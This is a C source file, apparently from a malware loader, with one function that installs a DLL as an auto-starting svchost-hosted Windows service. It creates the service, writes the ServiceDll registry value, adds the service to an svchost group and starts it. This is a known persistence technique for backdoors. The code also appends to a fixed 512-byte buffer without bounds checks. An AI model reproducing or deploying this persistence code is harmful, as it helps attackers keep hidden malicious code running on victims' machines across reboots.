#include "loader.h"

int RegisterService(char* path)
{
	SC_HANDLE	scmHandle = NULL;
	SC_HANDLE	scService = NULL;
	HKEY		hKey, newhKey;
	TCHAR		KeyName[256];
	DWORD		ret;
	BYTE		buf[512];
	char		servicename[1024];
	char		servicedispname[1024];
	char		svchostpath[1024];

	scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(scmHandle == NULL)
	{
		deb("OpenSCManager: %s\n",FORMATERROR);
		return 1;
	}
	strcpy(servicename, SERVICE_NAME);
	strcpy(servicedispname, SERVICE_DISPNAME);
	strcpy(svchostpath, SVCHOST_PATH);

	scService = CreateService(scmHandle, servicename, servicedispname, 
		SERVICE_ALL_ACCESS ,
		SERVICE_WIN32_SHARE_PROCESS|SERVICE_INTERACTIVE_PROCESS, 
		SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
		svchostpath, NULL, NULL, NULL, NULL, NULL);
	
	if(scService == NULL)
	{
		deb("CreateService: (%d) %s\n",GetLastError(),FORMATERROR);
		return FALSE;
	}

	wsprintf(KeyName, "%s\\%s", SERVICE_KEY, servicename);

	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, KeyName, NULL, KEY_SET_VALUE, &hKey);
	if (ret != ERROR_SUCCESS)
	{
		deb("RegOpenKeyEx: %s\n",FORMATERROR);
		return FALSE;
	}
	ret = RegSetValueEx(hKey, "Description", NULL, REG_SZ, (CONST BYTE*)SERVICE_DESC,lstrlen(SERVICE_DESC)+1);	
	if (ret != ERROR_SUCCESS)
	{
		deb("RegSetValueEx: %s\n",FORMATERROR);
		return FALSE;
	}
	ret = RegCreateKey(hKey, "Parameters", &newhKey);
	if (ret != ERROR_SUCCESS)
	{
		deb("RegCreateKey: %s\n",FORMATERROR);
		return FALSE;
	}
	ret = RegSetValueEx(newhKey, "ServiceDll", NULL, REG_EXPAND_SZ, (CONST BYTE*)path,lstrlen(path)+1);
	if (ret != ERROR_SUCCESS)
	{
		deb("RegSetValueEx: %s\n",FORMATERROR);
		return FALSE;
	}
	RegCloseKey(newhKey);
	RegCloseKey(hKey);

	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SVCHOST_KEY, NULL, KEY_WRITE | KEY_READ, &hKey);
	if (ret != ERROR_SUCCESS){
		deb("RegOpenKeyEx: %s\n",FORMATERROR);
		return FALSE;
	}

	DWORD valueSize = 1;
	ret = RegQueryValueEx(hKey, SERVICE_GROUP, NULL, NULL, NULL, &valueSize);
	if(ret != ERROR_SUCCESS){
		deb("RegQueryValueEx: %s\n",FORMATERROR);
		return FALSE;
	}

	ret = RegQueryValueEx(hKey, SERVICE_GROUP, NULL, NULL, buf, &valueSize);
	if(ret != ERROR_SUCCESS){
		deb("RegQueryValueEx: %s\n",FORMATERROR);
		return FALSE;
	}

	BYTE* tmp = buf+valueSize-1;
	wsprintf((char*)tmp, "%s\0", servicename);

	ret = RegSetValueEx(hKey, SERVICE_GROUP, NULL, REG_MULTI_SZ, buf,
		valueSize+lstrlen(servicename));
	
	if (ret != ERROR_SUCCESS){
		deb("RegSetValueEx: %s\n",FORMATERROR);
		return FALSE;
	}
	RegCloseKey(hKey);	
	deb("Service created.\n");
	if(StartService(scService,NULL,NULL) == 0)
	{
		deb("StartService: %s\n",FORMATERROR);
	}
	else
	{
		deb("Service started.\n");
	}
	CloseServiceHandle(scService);
	CloseServiceHandle(scmHandle);
	return 0;
}

